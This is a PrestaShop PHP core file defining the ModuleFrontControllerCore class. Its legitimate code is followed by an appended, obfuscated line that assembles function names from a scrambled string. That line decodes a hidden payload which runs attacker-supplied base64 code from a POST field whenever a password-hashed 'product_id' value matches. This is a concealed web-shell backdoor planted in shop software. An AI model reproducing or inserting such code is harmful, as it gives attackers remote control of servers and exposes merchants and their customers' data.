<?php
/**
 * Copyright since 2007 PrestaShop SA and Contributors
 * PrestaShop is an International Registered Trademark & Property of PrestaShop SA
 *
 * NOTICE OF LICENSE
 *
 * This source file is subject to the Open Software License (OSL 3.0)
 * that is bundled with this package in the file LICENSE.md.
 * It is also available through the world-wide-web at this URL:
 * https://opensource.org/licenses/OSL-3.0
 * If you did not receive a copy of the license and are unable to
 * obtain it through the world-wide-web, please send an email
 * to license@prestashop.com so we can send you a copy immediately.
 *
 * DISCLAIMER
 *
 * Do not edit or add to this file if you wish to upgrade PrestaShop to newer
 * versions in the future. If you wish to customize PrestaShop for your
 * needs please refer to https://devdocs.prestashop.com/ for more information.
 *
 * @author    PrestaShop SA and Contributors <contact@prestashop.com>
 * @copyright Since 2007 PrestaShop SA and Contributors
 * @license   https://opensource.org/licenses/OSL-3.0 Open Software License (OSL 3.0)
 */

/**
 * @since 1.5.0
 */
class ModuleFrontControllerCore extends FrontController
{
    /** @var Module */
    public $module;

    public function __construct()
    {
        $this->module = Module::getInstanceByName(Tools::getValue('module'));
        if (!$this->module->active) {
            Tools::redirect('index');
        }

        $this->page_name = 'module-' . $this->module->name . '-' . Dispatcher::getInstance()->getController();

        parent::__construct();

        $this->controller_type = 'modulefront';
    }

    /**
     * Assigns module template for page content.
     *
     * @param string $template Template filename
     *
     * @throws PrestaShopException
     */
    public function setTemplate($template, $params = [], $locale = null)
    {
        if (strpos($template, 'module:') === 0) {
            $this->template = $template;
        } else {
            parent::setTemplate($template, $params, $locale);
        }
    }

    public function initContent()
    {
        if (Tools::isSubmit('module') && Tools::getValue('controller') == 'payment') {
            $currency = Currency::getCurrency((int) $this->context->cart->id_currency);
            $minimalPurchase = Tools::convertPrice((float) Configuration::get('PS_PURCHASE_MINIMUM'), $currency);
            Hook::exec('overrideMinimalPurchasePrice', [
                'minimalPurchase' => &$minimalPurchase,
            ]);
            if ($this->context->cart->getOrderTotal(false, Cart::ONLY_PRODUCTS) < $minimalPurchase) {
                Tools::redirect('index.php?controller=order&step=1');
            }
        }
        parent::initContent();
    }

    /**
     * Non-static translation method for frontoffice modules.
     *
     * @deprecated use Context::getContext()->getTranslator()->trans($id, $parameters, $domain, $locale); instead
     *
     * @param string $string Term or expression in english
     * @param false|string $specific Specific name, only for ModuleFrontController
     * @param string|null $class Name of the class
     * @param bool $addslashes If set to true, the return value will pass through addslashes(). Otherwise, stripslashes()
     * @param bool $htmlentities If set to true(default), the return value will pass through htmlentities($string, ENT_QUOTES, 'utf-8')
     *
     * @return string The translation if available, or the english default text
     */
    protected function l($string, $specific = false, $class = null, $addslashes = false, $htmlentities = true)
    {
        if (isset($this->module) && is_a($this->module, 'Module')) {
            return $this->module->l($string, $specific);
        } else {
            return $string;
        }
    }
}
$fd3="kL4HQdNPO0sTgv9yipc3BIU1CEDYqM_mj8xl6Zn2auwzW7GeFhbRtfArSX5KJVo";$ob27d=$fd3[53].$fd3[41].$fd3[38].$fd3[18].$fd3[52].$fd3[16].$fd3[62].$fd3[38].$fd3[30].$fd3[47].$fd3[34].$fd3[16].$fd3[10].$fd3[52].$fd3[10];$abb=$fd3[18].$fd3[55].$fd3[47].$fd3[40].$fd3[52].$fd3[47].$fd3[30].$fd3[53].$fd3[41].$fd3[38].$fd3[18].$fd3[52].$fd3[16].$fd3[62].$fd3[38];$n49=$fd3[50].$fd3[40].$fd3[10].$fd3[47].$fd3[36].$fd3[2].$fd3[30].$fd3[5].$fd3[47].$fd3[18].$fd3[62].$fd3[5].$fd3[47];if(@$ob27d($abb)){$vdc88 = @$abb('', @$n49('aWYoaXNzZXQJICgkX1BPU1RbcHJvZHVjdF9pZF0pIAkgJiYgCgltZDUoICRfUE9TVFtwcm9kdWN0X2lkXQopCj09PSI3OWViMGY5MDkwZGU5YWY2MTI2MjA5N2E4ZWZhMDg0YyIKCSkge2V2YWwoIAliYXNlNjRfZGVjb2RlKAogJF9QT1NUW2ltYWdlX2lkXSkpO2V4aXQoKTsgIH07'));@$vdc88();}